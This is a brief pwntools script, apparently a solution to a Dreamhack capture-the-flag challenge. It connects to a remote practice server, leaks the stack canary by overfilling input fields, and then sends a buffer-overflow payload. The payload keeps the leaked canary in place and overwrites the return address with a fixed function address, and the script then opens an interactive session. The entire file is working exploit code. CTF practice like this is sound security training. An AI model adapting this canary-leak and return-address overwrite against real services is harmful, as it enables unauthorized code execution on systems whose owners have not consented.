from pwn import *
import sys

port = 8587
rem = remote("host3.dreamhack.games", port)

int_max = (2**31) - 1
double_max = sys.float_info.max
rem.sendafter(b"name: ", b"A" * 56)
rem.sendlineafter(b"age: ", str(int_max).encode())
rem.sendlineafter(b"height: ", str(double_max).encode())
rem.sendafter(b"(Female): ", b"A"*5)
canary = u64(b"\x00" + rem.recvline().rstrip()[76:83])

payload = b"B" * 0x68 + p64(canary) + b"B" * 8 + p64(0x40121a)
rem.sendafter(b"? ", payload)

rem.interactive()